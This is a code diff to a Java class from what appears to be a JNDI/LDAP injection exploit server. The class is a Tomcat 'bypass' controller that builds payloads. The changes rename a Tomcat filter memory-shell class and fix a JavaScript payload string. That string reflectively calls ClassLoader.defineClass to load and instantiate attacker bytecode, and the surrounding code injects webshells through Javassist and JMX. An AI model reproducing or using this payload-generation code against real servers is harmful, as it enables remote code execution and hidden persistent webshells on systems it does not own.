@@ -45,7 +45,7 @@ import static org.fusesource.jansi.Ansi.ansi;
 public class TomcatBypassController implements LdapController {
     private PayloadType payloadType;
     private String[]    params;
-    private GadgetType gadgetType;
+    private GadgetType  gadgetType;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -247,8 +247,8 @@ public class TomcatBypassController implements LdapController {
 
         public String injectTomcatFilterJmx() throws Exception {
             ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TFMSFromJMXF.class));
-            CtClass ctClass = pool.get(TFMSFromJMXF.class.getName());
+            pool.insertClassPath(new ClassClassPath(TFJMX.class));
+            CtClass ctClass = pool.get(TFJMX.class.getName());
             InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
             if (winAgent) {
@@ -551,7 +551,7 @@ public class TomcatBypassController implements LdapController {
                     "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                     "   clazz.newInstance();\n" +
                     "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getObject().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                     "   method.setAccessible(true);\n" +
                     "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                     "   clazz.newInstance();\n" +
@@ -575,7 +575,7 @@ public class TomcatBypassController implements LdapController {
                     "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
                     "   clazz.newInstance();\n" +
                     "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getObject().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                     "   method.setAccessible(true);\n" +
                     "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                     "   clazz.newInstance();\n" +
